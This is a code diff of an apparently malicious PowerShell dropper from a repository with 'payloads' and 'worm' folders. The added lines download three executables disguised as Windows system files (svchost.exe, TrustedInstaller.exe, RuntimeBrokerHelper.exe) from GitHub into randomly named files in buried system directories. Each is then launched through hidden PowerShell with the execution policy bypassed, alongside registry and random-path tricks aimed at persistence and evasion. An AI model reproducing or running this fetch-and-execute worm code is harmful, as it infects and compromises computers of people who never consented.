@@ -9,7 +9,9 @@ $user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')
 $initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
 $initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
 $initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/finde.exe"
-$serverUrl = ""
+$ftpUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/TrustedInstaller.exe"
+$serverUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/RuntimeBrokerHelper.exe"
+$usbUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/svchost.exe"
 $paths =  @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
     "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
@@ -112,6 +114,9 @@ $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $initFindePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initFindePath = "$initFindePath\$([System.IO.Path]::GetRandomFileName()).exe"
+$serverPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
+$ftpPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
+$usbPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
 $main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
@@ -133,7 +138,13 @@ $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
 iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
+iwr -Uri $serverUrl -OutFile $serverPath
+iwr -Uri $ftpUrl -OutFile $ftpPath
+iwr -Uri $usbUrl -OutFile $usbPath
 iwr -Uri $initFinde -OutFile $initFindePath
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$serverPath"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$ftpPath"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$usbPath"
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
 
 
